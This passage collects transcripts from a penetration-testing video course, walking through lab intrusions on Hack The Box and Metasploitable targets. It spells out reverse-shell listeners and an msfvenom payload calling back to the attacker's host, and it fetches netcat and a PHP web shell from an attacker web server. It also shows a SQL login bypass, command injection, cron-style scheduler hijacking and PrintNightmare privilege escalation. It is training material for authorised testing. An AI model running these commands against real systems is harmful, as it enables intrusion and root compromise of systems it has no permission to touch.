> **[2:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=156)** and we'll execute bin/bash. Okay, let's copy 8572.c and run into the temp folder on the target using [[Netcat]]. We go back to our shell, let's cd into temp, which is writeable, and we'll netcut -lvnp 1111, and we'll write in here 8572.c. And from Kali, we'll netcut 10.2.8, which is our Metasploitable server on port 1111. And we'll send it 8572.c. Okay, we'll do the same thing -lvnp 1111 and we'll write the run file, and we'll send that over, run. Okay, I'll now set up the listener on port 4444, nc -lvnp 4444.
>
> **[3:57](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=237)** And we'll just connecting again to our original shell.
>
> **[4:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=246)** Okay, so we're back in our original shell in the temp folder, and we'll compile with an output of 8572 our 8572.c program. And that compiles, we will make it executable 8572,
>
> **[4:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=273)** and let's check the pit value we need. Cat/proc/net/netlink. And we see it's 2350. Okay, let's escalate our privileges, ./8572 2350.
>
> **[4:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=296)** And in our listener, we now have a connect. And if we check who we are, we root. We've identified a number of ways to get shell. Sometimes root and sometimes user. We can now convert our user shells into a root shell. There's many more ways to explore Metasploitable, but it's time now to move on to a hardest set of targets.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (4), [[Ubuntu]] (3), [[PHP]] (2), [[Exploit-DB|Exploitdb]] (1), [[Netcat]] (1)
> **File Paths:** 8572.c (5), shelly.php (1)
> **CLI Commands:** php (2), make (2), cd (1), cat (1)
> **Versions:** 2.6 (2), 2.6.24 (1), 8.04 (1), 10.2.18 (1), 10.2.8 (1)
> **Ports:** port 4444 (2), port 1111 (1)
> **Cross-References:** go back to (2)
> **Tools:** bash (2)
> **Code Identifiers:** lsb_release (1)


### 6. End-to-End Testing

[↑ Back to Table of Contents](#table-of-contents)

#### [Starting with online labs](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=0)** - [Instructor] As a penetration tester, exercising your skills doesn't stop once you've completed this course, and not even after completing your Offensive Security Certified Professional Qualification. Systems change, new exploits are found, and new technologies emerge. You need to keep up to date, and that means continuing to exercise your skills. Earlier in the course, we introduced the Hack The Box and Defensive Security Online [[Penetration Testing]] Labs, which provide a range of systems to exploit with both local and route [[Tokens]] to claim. If you don't already have accounts on these labs you can sign up at the main sign in pages. For Offensive Security, you can sign up for a play account for free and this gives up to three hours use in any 24 hour period. Alternatively, you can sign up for a paid proving account, which gives access to many more systems with no session time limits. For Hack The Box, you can sign up to a standard account, which gives access to the starter machines, a set of first level targets for beginners, or you can take a VIP subscription and have access to the wider range of active and retired systems. For Hack The Box, we need to download the VPN pack to connect from our Kali system. Let's see how we're getting that. We logged into Hack The Box, so let's select connect to [[HackTheBox|HTB]] at the top right. We're currently offline and we have a number of lab options. For our purposes, we'll be going into the starting
>
> **[1:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=92)** point labs. When we select this, we get the option of either using OpenVPN Connect, using our own Kali instance, or upgrading to VIP, to gain access to a web-based version of the Parrot testing platform. We'll be using OpenVPN. We have a couple of choices of starting point servers, but we'll keep the US starting point. From here, we can download the VPN pack and we'll use that to connect from Kali.
>
> **[2:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=128)** I've copied the connection pack into Kali, so let's connect to the lab. I'll go sudo OpenVPN and I've called it kiwi1.ovpn.
>
> **[2:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=150)** And we're connected. We've got the option of starting point, which we can use with our free account, Academy Tracks and the full set of machines, if we have a VIP account. We'll be using the starting point targets. We can list them by clicking starting point and then selecting a system. We're at tier zero, and let's start the Meow machine. We do that by spawning the machine.
>
> **[3:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=191)** Okay, we started with IP address 10.129.10.86. Let's go look at the system. And we can [[Nmap]] -PS -sv 10.129.10.86
>
> **[3:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=226)** Okay, we can see we have telnet open. Let's leave Hack The Box for the moment and go and have a look at Offensive Security. Accessing Offensive Security is similar. We're at the main screen and we have access to a large number of play machines. At the top right, we can start a Kali instance in our browser and use that to access our target. Otherwise, we can click connect to VPN, and we can download an OpenVPN connection pack. We can see we have just under three hours left to play. As before, we can connect using OpenVPN, sudo openvpn, and the pack's called hackex.ovpn.
>
> **[4:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=285)** And we're connected. Now we can start a machine. Let's start Katana by clicking on the start icon at the right.
>
> **[5:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=303)** The instance starts up and we get its IP address. Let's take a look at that. Okay, so we can nmap -PS -sv 192.168.156.83.
>
> **[5:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=337)** And we can see that we have ports 21, 22, 80, and 8088 open. We'll leave this here for now. We'll be using these labs in the course and you'll likely want to continue to use them once you've finished.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nmap]] (2), [[Penetration Testing]] (1), [[Tokens]] (1), [[HackTheBox|Htb]] (1)
> **Env Vars:** vip (3), vpn (3), htb (1)
> **Versions:** 10.129.10 (2), 192.168.156 (1)
> **CLI Commands:** sudo (2)
> **Exercise Files:** download the (2)
> **Cross-References:** earlier in (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting rejetto](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=0)** - [Instructor] I'm VPN'd into our [[LinkedIn]] Learning Lab, and on the lab, we can find a target with IP address 10.10.10.8. Let's run a port enumeration using [[Nmap]] to get a sense of what we're targeting. nmap -PS
>
> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=15)** - sV 10.10.10.8, okay, we have a [[Windows]] host with only Port 80 open and running an HTTP file server. Let's see what's there. When we access the URL, there's a user portal. If we hover over the file server link, we can see that this is a Rejetto file server. We can search for an exploit for Rejetto using searchploit, searchploit rejetto. Okay, we got a number of options here. There's a Ruby exploit, so likely a [[Metasploit]] option, but let's do this one natively. We'll have a look at 39161.py. We'll copy /usr/share/[[Exploit-DB|exploitdb]]/
>
> **[1:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=72)** exploits/windows/remote/39161.py,
>
> **[1:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=80)** and we'll copy that to 39161.py. Let's have a look at it. In the comments, we can see that we call the script with the IP address and the port of the target. And we see that [[Netcat]] needs to be uploaded to the target. We can see three functions defined, script.create, execute.script, and nc_run. We can see these are simple exploits on the URL by using the null character to allow commands to be run. And further down, we'll see these commands, save, exe, and exe1, being defined. We can also see that the callback IP address and port need to be defined. Let's change these to my Kali listener IP address, 10.10.14.5, and we'll put the listener up on 2222. Below the port number, we can see the main vbs script, which is used to make all three of the scripts. I've unencoded the special characters so that we can examine the vbs program. We can see that it's opening an XMLHTTP stream and an Ado stream. It uses the XMLHTTP stream to upload netcat from our Kali attack machine through port 80 and saves it into \Users\Public using the Ado stream. Back in the exploit, I'll add a couple of print statements while we're here, just to see what we're doing, print "Creating script",
>
> **[3:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=183)** print "Running script", print "Connecting..." Okay, let's save the code. The exploit requires that I open a web server and that I have netcat present in my web root. Let's go to the web root, cd /var/www/[[HTML]]. Kali provides us with a copy of netcat for Windows, so I'll copy that in, sudo cp /usr/share/windows-binaries/nc.exe,
>
> **[3:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=228)** and we'll copy the, okay. Finally, let's start a simple web session on Port 80, [[Python (Programming Language)|python]] -m SimpleHTTPServer on port 80. Okay, I'll set up a reverse connection listener in a new terminal window, nc -lvmp 2222. And now, I'll run the exploit, python 39161.py.
>
> **[4:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=269)** I'm pointing that to 10.10.10.8, port 80, and we're connecting. And we've uploaded netcat and we've not connected yet. We'll run that again and now we've connected. And we can see we have a user.txt.txt file. That's a hackme box token conveniently placed in the web root. We can type user.txt.txt, and there's the token. And we can register that with [[HackTheBox]] 2nr point. Let's also get some details while we're here, whoami, we're on a server called optimum and we're operating under the kostas account. ver, running on [[Microsoft]] Windows 6.3.9600. And we can get more details with systeminfo.
>
> **[5:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=335)** Okay, this is a [[Windows Server]] 2012 64-bit system, and we've also get a list of hotfixes that have been applied. And we can see there are three users, Administrator, kostas, and Public. And if we have a look at Users\Public, ah, we have a look at \users\Public, we can see the two files we uploaded, nc.exe and script.vbs. Okay, we've got a user exploit and I've captured the Optimum server user flag. We'll leave Rejetto here for now, but to achieve full victory, we'd need to escalate privileges and get root. You can spend some time looking at the vbs code and experiment with how it's using the URL call. There's a reasonable amount to learn from this exploit.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (5), [[Netcat]] (5), [[Nmap]] (2), [[Python (Programming Language)|Python]] (2), [[LinkedIn]] (1)
> **CLI Commands:** python (2), find (1), ruby (1), make (1), cd (1)
> **Env Vars:** url (3), xmlhttp (2), vpn (1), http (1)
> **File Paths:** 39161.py (3), user.txt.txt (2), exploits/windows/remote/39161.py (1)
> **Ports:** port 80 (5)
> **Versions:** 10.10.10 (3), 10.10.14 (1), 6.3.9600 (1)
> **Code Identifiers:** sv (1), nc_run (1)
> **Definitions:** is a  (2)

#### [Exploiting the Devel](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=0)** - [Instructor] The next Hack The Box target we'll look at is 10.10.10.5. Once again, the first thing we'll do is run [[Nmap]] to find out what we're targeting. Nmap 10.10.10.5
>
> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=15)** - ps -sp. We have a [[Windows]] host with port 21 and port 80 open. We don't have any firm indication yet of the operating system or host name. Let's check the FTP service and see whether we can get in as anonymous, and if so, what we can see. FTP 10.10.10.5. Name, anonymous, end. Put in an email address as our password. Ls, ls. Oh, we can see an [ASP.NET](https://ASP.NET) client folder and an IIS start file. Let's have a look in the [ASP.NET](https://ASP.NET) client and see what's there. LS aspnet_client, and this got a system web. So let's have a look at that, \\system_web. And that is a 2_0_50727. 2_0_50727, and it's empty. All right. Let's see if we can upload a file. Put test.text. Once we're complete, and if we ls, we can see we have test.text
>
> **[1:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=109)** and we can get test.text, and we can display that by doing /dev/tty. And we can see that's our test file full of vowels. We have an [ASP.NET](https://ASP.NET) folder. So it seems the FTP route is also the IIS route and further an ASP or ASPX Shell implant seems like a reasonable candidate to upload. Let's upload our Shell file, aspen.aspx. Put aspen.aspx. And that was successful. Let's now navigate to it. 10.10.10.5 \aspen.aspex. And we have a command entry. Let's see who we are. Who am I? We're IIS apppool\web. System info. And we're a Windows 7 enterprise host called DEVEL. The registered owner is Babis. Let's have a look at the users on the system. We have administrator Babis and the NetApp pool and public. And let's have a look at what users Babis has, and it's empty.
>
> **[3:25](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=205)** We've got our users shell, but we need to get privileges to find our [[Tokens]]. Using the Aspen implant is all very well, but we need more. Let's use [[Metasploit|msfvenom]] to get ourselves a meterpreter shell that we can use for privilege escalation. We'll make this an ASPX Shell. Msfvenom -p windows /interpreter /reverse_tcp LHOST= 10.10.14.5, LPORT=2222. Our format is ASPX. We can put our architecture as x86 and we're going to create metty.aspx. We can copy that up using FTP. FTP 10.10.10.5. And our user is anonymous. We'll put in our email address and we'll put metty.aspx. That was successful. I'll exit out of that. And let's set up a meterpreter listener and we'll use [[Metasploit|msfconsole]] for that, [[Metasploit]].
>
> **[5:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=300)** And we'll use exploits/multi/handler. We'll set payload to windows/interpreter /reverse_tcp. We'll set LHOST to 10.10.14.5. Then we'll set LPORT to 2222 and we'll run. We're listening. Now let's go call metty, metty.aspx, and we've got a Meterpreter Shell. Let's have a look at the system information. Windows 7, build 7,600. Let's drop down to a shell and we can check our privileges. And we are iis apppool\web as we'd expect. So we've got to use a shell. Let's get out of the shell and put the meterpreter shell into the background. So exit back to meterpreter and background it. So I have session one backgrounded. Now let's look for an exploit to escalate privileges. Search exploits
>
> **[6:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=397)** /windows/local. Exploit/windows/local. And there's a few of them here for us to investigate, but we'll go straight to one about halfway down called KiTrap0D, and that's number 92. So we'll use 92 and we'll set LHOST 10.10.14.5. And in this case, we'll set LPORT to 4444. And we'll link this to our existing background session by saying set session 1. So let's exploit and see if we can escalate our privileges. And we get another meterpreter shell. So let's go down to the Windows Shell and see who I am. Who am I? I'm the entry authority system. So we're now a privileged account. And we can look at users\babis under users\babis \desktop, dlr\ users\babis\desktop. And we can see the user.text.text file.
>
> **[8:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=494)** And if we type \users \babis\desktop \user.text.text, we see our token. And let's have a look at \users \administrator. And again we have desktop dlr\users\administrator \desktop. And we have a root.text file. So we can now type \users\administrator \desktop \root.txt. And we have our root token. We're now in full control of the DEVEL.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (8), [[ASP.NET]] (3), [[Nmap]] (2), [[Metasploit|Msfvenom]] (2), [[Tokens]] (1)
> **Env Vars:** ftp (5), asp (4), net (3), iis (3), aspx (3)
> **Versions:** 10.10.10 (5), 10.10.14 (3)
> **CLI Commands:** ls (4), find (2), make (1)
> **Code Identifiers:** reverse_tcp (2), aspnet_client (1), system_web (1)
> **URLs:** [asp.net](https://asp.net) (3)
> **Ports:** port 21 (1), port 80 (1)
> **Speakers:** - [instructor] (1), - ps (1)

#### [Time to exploit Cronos](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=0)** - [Instructor] The final Hack The Box target we'll look at is 10.10.10.13, otherwise known as Cronos. This is an example of a more complex target in which deeper enumeration and spending time researching the target applications is the key to getting access. Once again, the first thing we'll do is run [[Nmap]] to find out what we're targeting and we'll use the minus A switch to get the full details of the services nmap -A -PS -A 10.10.10.13.
>
> **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=35)** We have a [[Linux]] host with ports 22, 53 and 80 open. There's not much more obvious information here. Let's do a quick check of what we can see on the web server, 10.10.10.13. We have the default Apache page. There's nothing to see here. We might start running [[Gobuster]] to see if we can find any hidden pages but before we do that, let's reflect on what we've found already. We have a website which has port 53 open, and this may indicate there's more than just one website being served up. Apache allows multiple name based websites to be served from just one IP address. And this information page indicates we can use the hosts file to access the name site. In reality, we'd need to do a bit of open source intelligence to find out more, but let's take a guess and say that 10.10.10.13, maybe a server for multiple virtual hosts and one of them's called cronos.[[HackTheBox|htb]]. I'll add this to my /etc/hosts file. Sudo nano /etc/hosts and we'll add 10.10.10.13 and call it cronos.htb and let's check that, http cronos.htb.
>
> **[2:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=134)** Okay, we see that Cronos is indeed a virtual host named website. The next thing we need to do is find out what other websites exist on this server. To do this, we need to use the dig tool and do its own transfer from the server. Dig AXFR @10.10.10.13 cronos.htb +nostat +noCMD +nocomments.
>
> **[2:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=170)** Dig provides a list of all named hosts for the cronos.htb domain, admin.cronos.htb, nS1.cronos.htb and www.cronos.htb. We've already seen the main www.cronos.htb site. So let's now see what we can find in admin.cronos.htb. And I'll add this to my et cetera hosts file also 10.10.10.13 admin.cronos.htb.
>
> **[3:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=210)** And again, let's have a look and see what we can find. Admin.cronos.htb, and we get to the login page for the admin site. So the next challenge is to bypass the login and using a standard injection approach is a good start. We'll enter admin'# and we won't bother putting a password in, we just submit. And we've bypassed the login. This worked as we essentially caused the internally generated query to comment out the password check but we're in the net tool page and we can enter an IP address which will be used to construct a trace ramp command. Let's see if we can inject a command into this by using a semi-colon. We'll put LS and execute. And yes we can. We get a directory listing so we have command line execution. Let's see what our privileges are. Who am I? I'm www-data. Let's see what users are registered under home. LS/home and we have just one noulis. Let's see what they have in their home folder, LS/home/noulis. And we see it's the user token, and we can cat/home/noulis/user.text
>
> **[5:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/time-to-exploit-cronos?u=76281980&t=312)** and we retrieve the token.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[HackTheBox|Htb]] (12), [[Nmap]] (2), [[Linux]] (1), [[Gobuster]] (1)
> **CLI Commands:** find (6), ls (3), apache (2), sudo (1), cat (1)
> **Versions:** 10.10.10 (7)
> **Definitions:** known as (1), is an  (1), is a  (1)
> **Code Identifiers:** nocmd (1), ns1 (1)
> **Ports:** port 53 (1)
> **Env Vars:** axfr (1)
> **Tools:** command line (1)

#### [Cronos revisited: Getting to the root](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=0)** - [Lecturer] We can now get into Cronos. and we've got user access. But we want to get to the root. And to do this we'll want to have a user shell. It turns out that Cronos doesn't allow the use of the minus C switch on [[Netcat]]. So we can't force a reverse shell. However, it does support [[PHP]], so we can use wget to upload our Shelly implant. I've got shelly.php ready with the correct IP address in port. But uploading PHP files through a web exploit can be tricky. So I'll make a copy called shelly.txt, and we'll upload that, then rename it when it's on the target. Copy shelly.php to shelly.txt. And I'll start a web server on port 80. [[Python (Programming Language)|Python]] -m SimpleHTTPServer port 80.
>
> **[0:58](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=58)** Okay, let's upload our shell. We'll wget [http://10.10.14.2/shelly.txt](http://10.10.14.2/shelly.txt).
>
> **[1:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=75)** Okay, and we'll now move shelly.txt
>
> **[1:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=84)** and rename it shelly.php. We don't need the HTTP server anymore, so let's clear that. And set up a listener, nc -lvnp 2222.
>
> **[1:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=105)** And let's see if we've got a shelly.php. And we have. Of course, as a user shell we're limited in what we can do. Let's see what websites we have, ls /var/www. And we can see the main website, and the admin website, and also one called [[Laravel]]. Let's do a bit of research on Laravel. Laravel is a PHP framework for web developers. It includes a scheduler, and this runs at root privilege. This is managed by a PHP file called kernel.php. Let's take a look at that. So, we go to /var/www/laravel. And the file's in app/Console. If we have a look at what's in there, we find kernel.php is in there and its www-data owner. So we've got full access to it. It turns out that we can't run Nano to edit in situ, but we can use netcat to copy the file out and change it, and then copy it back in again. I'll set up a listener in kali, nc -lvnp 1111.
>
> **[3:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=191)** And when I get the file I'll copy it into Kernel.php. And I'll nc 10.10.14.2 1111. And I'll send Kernel.php with a three-second timer. Okay, so we've got this file. And we can study it at our leisure and create our next exploit stage. However, as a demonstration let's update the file to copy the root token into the admin web folder where shelly.php lives. So, let's have a look, nano Kernel.php. The scheduler as standard initiates an hourly job to change the inspirational message. Let's change that. And we'll change it from a command in Laravel to an operating system command. And we'll change it to copy /root/root.txt, which is where the root flag is, into /var/www/admin. And we'll call it myroot.txt. And that's going to be copied under the root account. So we'll need to chmod it and give it all the permissions. /var/www/admin/myroot.txt. Okay, so we're copying root.txt
>
> **[4:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=288)** into var/www/admin/myroot.txt. And we're changing its permission so that we can read it. We're not going to do that hourly. We'll do that every minute. Okay, let's save that. And let's set up a listener. And send Kernel.php back to where it came from. And nc 10.10.14.2 1111. And we'll take back Kernel.php. Okay, and if we list /var/www/admin, we don't have a myroot.txt, but we'll wait for a minute. And we'll ls/var/www/admin again.
>
> **[5:50](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=350)** And now we have a myroot.txt. So, let's cat /var/www/admin/myroot.txt.
>
> **[6:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/cronos-revisited-getting-to-the-root?u=76281980&t=363)** And we have the root token. The Cronos server's a good example of a medium-level target showing the level of research necessary to be able to navigate through a number of steps to get root access. In the real world many systems you'll be asked to test will have been locked down before you get to them. And simple vulnerabilities will have been patched. You'll often be facing challenges like Cronos. Practicing in the Hack The Box lab is important to maintain your skills and to gain exposure to many different challenges.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (16), [[Laravel]] (5), [[Netcat]] (2), [[Python (Programming Language)|Python]] (1)
> **CLI Commands:** php (16), wget (2), ls (2), make (1), python (1)
> **File Paths:** kernel.php (7), shelly.php (5), shelly.txt (3), myroot.txt (3), var/www/admin/myroot.txt (3)
> **Env Vars:** php (4), http (1)
> **Versions:** 10.10.14 (3)
> **Prerequisites:** set up (3)
> **Ports:** port 80 (2)
> **URLs:** [http://10.10.14.2/shelly.txt](http://10.10.14.2/shelly.txt) (1)

#### [Using a nightmare escalator](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=0)** - [Instructor] An exploit called PrintNightmare became a critical issue for many IT teams in mid 2021. It's affected all Window systems, and enabled the attacker to quickly get root privileges. It's an exploit which affects the Print Spooler service. Let's take a look at how we can use it against an unpatched system. We'll be using the approach published here to show how this works. There's a machine on the main Hack The Box system called Heist, which we'll use as a target for running the PrintNightmare exploit. Its IP address is 10.10.10.149. The first thing we need to do is download the PrintNightmare proof of concept, which we'll rename to just nightmare, sudo [[Git]] clone [https://github.com/calebstewart/CVE-2021](https://github.com/calebstewart/CVE-2021)-
>
> **[1:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=60)** 1675.git, and we'll call it just nightmare. We need to have authenticated user access to run PrintNightmare. For the purpose of this demonstration, we'll skip the initial exploitive Heist and go directly to using a set of user credentials. The user is called chase, the domain name is supportdesk, and we know the password. We'll connect to the server using a pen testing client for [[Windows]] Management called Evil WinRM. We can install this as a RubyGem, sudo gem install evil-winrm.
>
> **[1:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=103)** Okay, let's clear that. Let's now connect to our Windows target, evil-winrm -i 10.10.10.149, minus user, -u
>
> **[2:01](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=121)** supportdesk\\chase -p 'Q4}sJu\Y8qz*A3?d'.
>
> **[2:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=143)** Okay, we now have command line access to the target, and we're using [[Powershell]]. Let's upload the exploit from calebstewart, upload nightmare/CVE-2021-1675.ps1.
>
> **[2:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=169)** Okay, we've uploaded our PowerShell script to the target, let's now import it. Import-Module .\CVE-2021-1675.ps1.
>
> **[3:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=185)** And that's imported, and now let's invoke it. Invoke-Nightmare -NewUser "akhtar" -NewPassword "wildcat".
>
> **[3:30](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=210)** Okay, and that's created a new administrative user. Let's start a new terminal and access the target using these credentials, evil-winrm -i 10.10.10.149 -u akhtar -p 'wildcat'.
>
> **[3:56](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=236)** And we now have an administrative session and we can dump the administrators root flag, cat /users/Administrator/Desktop/root.txt.
>
> **[4:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-a-nightmare-escalator?u=76281980&t=256)** That's all there is to getting a root shell with PrintNightmare.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Git]] (2), [[Windows]] (2), [[Powershell]] (2), [[GitHub]] (1)
> **CLI Commands:** sudo (2), git (2), cat (1)
> **Tools:** powershell (2), github (1), command line (1), terminal (1)
> **Env Vars:** cve (3)
> **Versions:** 10.10.10 (3)
> **Prerequisites:** install (2)
> **File Paths:** users/administrator/desktop/root.txt (1)
> **Code Identifiers:** sju (1)


### 7. Crafting Exploit Scripts

[↑ Back to Table of Contents](#table-of-contents)

#### [Introducing kali-autopilot](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=0)** - [Instructor] When we're teaching or running workshops, it's useful to have an attack script that we know works. Rather than manually run attack commands. We can use a tool called Kali-autopilot, which will generate a [[Python (Programming Language)|Python]] attack script to automate the attack. We'll use our virtual box lap for our initial introduction to Kali-autopilot. If Kali-autopilot isn't already installed in Kali, then we can load it simply by entering sudo APT install Kali-autopilot.
>
> **[0:38](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=38)** Let's start Kali-autopilot with the command Kali-autopilot.
>
> **[0:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/introducing-kali-autopilot?u=76281980&t=51)** Kali-autopilot has a single screen interface for entry of the attack plan and generation of attack scripts. The top-left panel is a list of attack script plans. And the remaining panels show the details of the currently selected plan. We can add, remove, and copy plans. And we can also import and export attack plans for sharing with the personal cyber range community. Let's create a new attack plan. I've prepared a target server on IP address, 10 dot naught dot two dot 40 using the [[OWASP]] Juice Shop system shown here. In a real attack, the attacker would run a command at their workstation, check the output, and then decide what to do next. However, when we are writing our exploit plan for Kali-autopilot, we focus on the sequence of commands the attacker will run. And for the most part, we ignore any responses. We can create a new plan, or we can use an existing plan as a start point. We're going to create a new plan. So let's start by entering the name in the script box. And we'll call it Juicy. Then we'll press add. Okay, we've created a plan, but we have no details. And we'll now enter the details in the variables and scripted attack grids. If we were to use an existing plan, then we'd have highlighted the original plan in the list, entered a new name in the script name box, and then press 